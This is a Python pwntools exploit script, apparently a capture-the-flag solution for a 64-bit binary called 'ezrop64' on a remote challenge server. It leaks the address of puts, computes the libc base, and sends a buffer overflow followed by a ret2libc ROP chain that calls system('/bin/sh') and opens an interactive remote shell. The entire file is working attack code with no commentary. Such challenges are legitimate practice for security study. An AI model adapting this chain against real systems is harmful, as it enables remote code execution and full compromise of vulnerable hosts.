from pwn import *

context(os="linux", arch="amd64", log_level="info")

#io = process("./ezrop64")
io = remote("node5.anna.nssctf.cn", 25628)
elf = ELF("./ezrop64")
libc = ELF("./libc.so.6")

poprdi_addr = 0x4012a3
ret_addr = 0x40101a

io.recvuntil("Gift :")
puts_addr = int(io.recv(14), 16)
print("puts address = ", hex(puts_addr));
libc_base = puts_addr - libc.sym['puts']
print("libc base address = ", hex(libc_base));
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search("/bin/sh\x00"))

payload = cyclic(0x100+0x8) + p64(ret_addr) + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)

io.recvuntil(b"rop.")
io.sendline(payload)


io.interactive()

